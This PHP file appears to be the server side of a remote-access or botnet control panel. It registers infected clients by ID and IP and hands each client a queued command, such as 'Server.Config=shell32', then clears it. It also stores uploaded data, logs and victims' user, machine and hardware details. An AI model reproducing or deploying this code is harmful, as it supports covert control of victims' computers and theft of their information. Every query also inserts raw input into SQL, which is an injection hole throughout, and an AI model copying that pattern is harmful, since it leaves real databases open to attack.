<?php 
 function create_new_user($uid, $tag) {
  require('assets/config.php');
  $ip = $_SERVER['REMOTE_ADDR'];
  $time = date("d-m-Y").", ".date("h:i:s")." AM";
  $mysqli->query("INSERT INTO users (tag, uid, ip, fresp, lresp) VALUES ('$tag', '$uid', '$ip', '$time', '$time')");
  $mysqli->query("UPDATE users SET team='Server.Config=shell32' WHERE uid='$uid'");
 }

 function update_user($uid){
  require('assets/config.php');
  $ip = $_SERVER['REMOTE_ADDR'];
  $time = date("d-m-Y").", ".date("h:i:s")." AM";
  $mysqli->query("UPDATE users SET lresp='$time' WHERE uid='$uid'");
  $mysqli->query("UPDATE users SET ip='$ip' WHERE uid='$uid'");
 }

 function return_instruction($uid) {
    require('assets/config.php');
    update_user($uid);
    $query = $mysqli->query("SELECT team FROM users WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    echo $result['team'];
    $mysqli->query("UPDATE users SET team='' WHERE uid='$uid'");
 }

 function accept_data($uid, $info) {
    require('assets/config.php');
    update_user($uid);
    $time = date("d-m-Y").", ".date("h:i")." AM";

    $query = $mysqli->query("SELECT buffer FROM users WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    $result = $result['buffer'];

    $info = str_replace("\\\\", "/", $info);
    $mysqli->query("UPDATE users SET buffer='$result <b class=\"red\">($time)</b> $info<br>' WHERE uid='$uid'");
 }

 function accept_config($uid, $un, $mn, $os, $tram, $cpu, $gpu, $dig) {
    require('assets/config.php');
    update_user($uid);
    $mysqli->query("UPDATE users SET uname='$un' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET cname='$mn' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET os='$os' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET tram='$tram GB' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET cpu='$cpu' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET gpu='$gpu' WHERE uid='$uid'");
    $mysqli->query("UPDATE users SET digit='$dig' WHERE uid='$uid'");
 }

 function accept_log($uid, $info) {
    require('assets/config.php');
    update_user($uid);
    $time = date("d-m-Y").", ".date("h:i")." AM";

    $query = $mysqli->query("SELECT log FROM users WHERE uid='$uid'");
    $result = $query->fetch_assoc();
    $result = $result['log'];

    $info = str_replace("\\\\", "/", $info);
    $mysqli->query("UPDATE users SET log='$result <b class=\"red\">($time)</b> $info<br>' WHERE uid='$uid'");
 }
?>